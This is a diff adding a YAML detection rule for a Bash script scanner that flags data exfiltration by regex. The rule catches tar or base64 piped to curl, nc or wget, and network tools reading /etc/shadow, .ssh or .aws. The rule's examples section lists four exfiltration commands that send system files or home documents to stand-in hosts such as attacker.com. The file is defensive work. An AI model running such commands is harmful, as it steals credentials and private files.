@@ -1,0 +1,42 @@
+# Bash Pattern: Data Exfiltration via Network
+# Detects data exfiltration using network tools
+
+id: BASH-009
+name: Data Exfiltration via Network
+description: |
+  Detects attempts to exfiltrate data using network tools combined with sensitive
+  file access or encoding. Plain curl POST is common for APIs. Pattern focuses on
+  pipe chains (tar|curl, base64|curl) or sensitive files (/etc/shadow, .ssh) being
+  sent to network, which indicates malicious intent rather than legitimate API calls.
+languages:
+  - bash
+detection_type: regex
+# Focus on pipe chains to network tools or sensitive file exfil
+# Plain curl -d is too common for legitimate API usage
+detection_logic: 'tar\b[^\n]*\|[^\n]*(?:curl|nc|wget)|base64\b[^\n]*\|[^\n]*(?:curl|nc)|curl\b[^\n]*(?:/etc/shadow|/etc/passwd|\.ssh|\.aws)|nc\b[^\n]*<[^\n]*(?:/etc|/home|\.ssh)'
+severity: High
+mitre_technique: T1041
+confidence: 0.7
+category: exfiltration
+enabled: true
+paranoia_levels:
+  - 1
+  - 2
+  - 3
+metadata:
+  author: Script Sentinel Team
+  created: "2025-11-17"
+  updated: "2025-11-17"
+  references:
+    - "https://attack.mitre.org/techniques/T1041/"
+    - "https://attack.mitre.org/tactics/TA0010/"
+  tags:
+    - bash
+    - exfiltration
+    - data-theft
+    - network
+  examples:
+    - "tar czf - /etc | curl -X POST -d @- http://attacker.com/upload"
+    - "cat /etc/passwd | base64 | curl -d @- http://evil.com/collect"
+    - "tar czf - /home/user/documents | nc attacker.com 4444"
+    - "wget --post-file=/etc/shadow http://attacker.com/receive"
